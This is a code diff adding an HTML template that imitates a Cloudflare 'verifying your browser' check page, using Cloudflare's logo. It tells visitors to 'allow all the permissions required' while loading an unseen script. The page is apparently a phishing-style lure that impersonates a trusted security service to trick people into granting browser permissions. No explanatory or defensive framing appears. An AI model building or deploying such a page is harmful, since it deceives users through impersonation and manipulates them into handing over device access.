@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        #loading {
+            text-align: center;
+        }
+        #loading-logo {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 20px;
+        }
+        #lock-animation {
+            width: 100px;
+            height: 100px;
+            margin: 20px auto;
+            animation: blink 1.5s steps(5, start) infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        #loading-text {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        #loading-subtext {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        #additional-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 10px;
+        }
+        #loading-dots {
+            display: inline-block;
+            font-size: 24px;
+            color: #333;
+            animation: blink 1s steps(5, start) infinite;
+        }
+    </style>
+</head>
+<body>
+    <div id="loading">
+        <img id="loading-logo" src="https://www.cloudflare.com/img/cf-naked-eye-icon.png" alt="Loading">
+        <img id="lock-animation" src="https://img.icons8.com/color/100/000000/lock-2.png" alt="Lock Animation">
+        <div id="loading-text">Just a moment<span id="loading-dots">...</span></div>
+        <div id="loading-subtext">We are verifying your browser, please wait...</div>
+        <div id="additional-text">We are checking all security measures. Kindly allow all the permissions required for secure browsing and checking.</div>
+    </div>
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
